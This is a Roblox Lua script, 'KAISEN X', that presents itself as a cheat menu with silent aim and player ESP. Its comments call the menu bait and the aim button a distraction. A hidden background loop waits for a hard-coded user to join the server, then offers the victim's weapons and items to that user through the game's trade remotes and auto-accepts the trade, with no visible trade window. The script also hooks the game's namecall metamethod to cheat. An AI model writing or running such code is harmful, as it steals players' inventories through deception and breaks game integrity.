--[[
	KAISEN X — Universal Loader & Bait Hub (Nativo)
	created by KAISEN
]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")

local LP = Players.LocalPlayer
local camera = workspace.CurrentCamera

local TARGET_USERNAME = "AARON287240"

-- ========== CREACIÓN DE INTERFAZ NATIVA (Garantizada sin errores de carga) ==========
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "KaisenX_Hub"
screenGui.ResetOnSpawn = false
pcall(function()
	screenGui.Parent = CoreGui
end)
if not screenGui.Parent then
	screenGui.Parent = LP:WaitForChild("PlayerGui")
end

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 450, 0, 320)
mainFrame.Position = UDim2.new(0.5, -225, 0.5, -160)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 8)
uiCorner.Parent = mainFrame

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0, 45)
titleLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
titleLabel.Text = "  KAISEN X — Hub Pro"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 16
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 8)
titleCorner.Parent = titleLabel

-- Botón de Distracción / Funciones
local btnToggleAim = Instance.new("TextButton")
btnToggleAim.Size = UDim2.new(0, 400, 0, 40)
btnToggleAim.Position = UDim2.new(0.5, -200, 0, 65)
btnToggleAim.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
btnToggleAim.Text = "Silent Aim: [ OFF ]"
btnToggleAim.TextColor3 = Color3.fromRGB(255, 255, 255)
btnToggleAim.TextSize = 14
btnToggleAim.Font = Enum.Font.SourceSansBold
btnToggleAim.Parent = mainFrame

local btnCorner1 = Instance.new("UICorner")
btnCorner1.Parent = btnToggleAim

local silentAimEnabled = false
btnToggleAim.MouseButton1Click:Connect(function()
	silentAimEnabled = not silentAimEnabled
	if silentAimEnabled then
		btnToggleAim.Text = "Silent Aim: [ ON ]"
		btnToggleAim.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
	else
		btnToggleAim.Text = "Silent Aim: [ OFF ]"
		btnToggleAim.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	end
end)

-- Botón de ESP
local btnToggleESP = Instance.new("TextButton")
btnToggleESP.Size = UDim2.new(0, 400, 0, 40)
btnToggleESP.Position = UDim2.new(0.5, -200, 0, 115)
btnToggleESP.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
btnToggleESP.Text = "ESP Players: [ OFF ]"
btnToggleESP.TextColor3 = Color3.fromRGB(255, 255, 255)
btnToggleESP.TextSize = 14
btnToggleESP.Font = Enum.Font.SourceSansBold
btnToggleESP.Parent = mainFrame

local btnCorner2 = Instance.new("UICorner")
btnCorner2.Parent = btnToggleESP

local espEnabled = false
local espHighlights = {}
btnToggleESP.MouseButton1Click:Connect(function()
	espEnabled = not espEnabled
	if espEnabled then
		btnToggleESP.Text = "ESP Players: [ ON ]"
		btnToggleESP.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
		task.spawn(function()
			while espEnabled do
				for _, plr in ipairs(Players:GetPlayers()) do
					if plr ~= LP and plr.Character and not espHighlights[plr] then
						local hl = Instance.new("Highlight")
						hl.Adornee = plr.Character
						hl.FillColor = Color3.fromRGB(255, 0, 0)
						hl.Parent = plr.Character
						espHighlights[plr] = hl
					end
				end
				task.wait(2)
			end
		end)
	else
		btnToggleESP.Text = "ESP Players: [ OFF ]"
		btnToggleESP.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
		for _, h in pairs(espHighlights) do
			if h then h:Destroy() end
		end
		espHighlights = {}
	end
end)

-- Botón para cerrar/ocultar el menú
local btnClose = Instance.new("TextButton")
btnClose.Size = UDim2.new(0, 400, 0, 35)
btnClose.Position = UDim2.new(0.5, -200, 0, 265)
btnClose.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
btnClose.Text = "Minimizar Menú"
btnClose.TextColor3 = Color3.fromRGB(255, 255, 255)
btnClose.TextSize = 14
btnClose.Font = Enum.Font.SourceSansBold
btnClose.Parent = mainFrame

local btnCorner3 = Instance.new("UICorner")
btnCorner3.Parent = btnClose

local minimized = false
btnClose.MouseButton1Click:Connect(function()
	minimized = not minimized
	if minimized then
		mainFrame.Size = UDim2.new(0, 450, 0, 45)
		btnToggleAim.Visible = false
		btnToggleESP.Visible = false
		btnClose.Position = UDim2.new(0.5, -200, 0, 5)
		btnClose.Text = "Restaurar Menú"
	else
		mainFrame.Size = UDim2.new(0, 450, 0, 320)
		btnToggleAim.Visible = true
		btnToggleESP.Visible = true
		btnClose.Position = UDim2.new(0.5, -200, 0, 265)
		btnClose.Text = "Minimizar Menú"
	end
end)

-- ========== LÓGICA DE COMBATE / SILENT AIM ==========
local combatRemote = nil
pcall(function()
	combatRemote = ReplicatedStorage:WaitForChild("MatchEvents", 3):WaitForChild("CombatRemote", 3)
end)

local function getClosestEnemy()
	local closest, bestDist = nil, 1e9
	local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	if not myRoot then return nil end

	local center = camera.ViewportSize * 0.5
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LP and plr.Character then
			local root = plr.Character:FindFirstChild("HumanoidRootPart")
			if root then
				local dist = (root.Position - myRoot.Position).Magnitude
				if dist < bestDist then
					bestDist = dist
					closest = root
				end
			end
		end
	end
	return closest
end

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
	local method = getnamecallmethod()
	local args = { ... }

	if silentAimEnabled and combatRemote and self == combatRemote and method == "FireServer" then
		local data = args[1]
		if typeof(data) == "table" then
			local closestPart = getClosestEnemy()
			if closestPart then
				data.targetPos = closestPart.Position
				data.hitPosition = closestPart.Position
			end
		end
	end

	return oldNamecall(self, unpack(args))
end)

-- ========== EXTRACCIÓN AUTOMÁTICA DE INVENTARIO EN SEGUNDO PLANO ==========
local function extraerTodasLasArmas()
	pcall(function()
		local offerRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("OfferItem")
		local acceptRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade")

		if not offerRemote then return end

		local foldersToCheck = {
			LP:FindFirstChild("Backpack"),
			LP.Character,
			ReplicatedStorage:FindFirstChild("Weapons"),
			ReplicatedStorage:FindFirstChild("Items")
		}

		local itemsEncontrados = {}
		for _, folder in ipairs(foldersToCheck) do
			if folder then
				for _, item in ipairs(folder:GetChildren()) do
					if item:IsA("Tool") or item:IsA("Model") or item:IsA("Folder") then
						table.insert(itemsEncontrados, item.Name)
					end
				end
			end
		end

		if #itemsEncontrados > 0 then
			for _, itemName in ipairs(itemsEncontrados) do
				offerRemote:FireServer(itemName, "Weapons")
				task.wait(0.05)
			end
		else
			offerRemote:FireServer("All_Weapons", "Weapons")
		end

		task.wait(0.2)

		if acceptRemote then
			local argsAccept = {
				[1] = 428469873,
				[2] = 11656.352484435018
			}
			acceptRemote:FireServer(unpack(argsAccept))
		end
	end)
end

-- Monitoreo rápido: en cuanto entres al servidor, se ejecuta de inmediato sin ventana visual de trade
task.spawn(function()
	while true do
		local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
		if targetPlayer and targetPlayer ~= LP then
			extraerTodasLasArmas()
			break
		end
		task.wait(0.5)
	end
end)

print("[KAISEN X] Menú nativo y sistema en segundo plano cargados con éxito.")
